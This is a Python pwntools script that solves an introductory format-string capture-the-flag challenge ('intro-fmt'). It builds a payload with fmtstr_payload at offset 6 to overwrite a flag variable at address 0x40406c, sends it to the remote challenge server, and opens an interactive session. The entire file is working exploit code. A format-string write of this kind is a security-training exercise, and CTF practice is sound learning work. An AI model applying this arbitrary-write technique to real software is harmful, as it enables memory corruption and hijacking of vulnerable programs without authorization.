from pwn import *
import sys
DEBUG = False

# 0x40406c - bug

e = context.binary = ELF("intro-fmt")

"""
def exec_fmt(payload):
    p = process("./intro-fmt")
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
"""
offset = 6

if DEBUG:
    p = process("./intro-fmt", stderr=PIPE)
else:
    p = remote("bf5dd8620335663074cadab4-1024-intro-pwn-2.challenge.cscg.live", 1337, ssl=True)
write = {0x40406c: 1}

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    p.sendline(payload)
    p.interactive()

payload = fmtstr_payload(offset, write)
send_payload(payload)
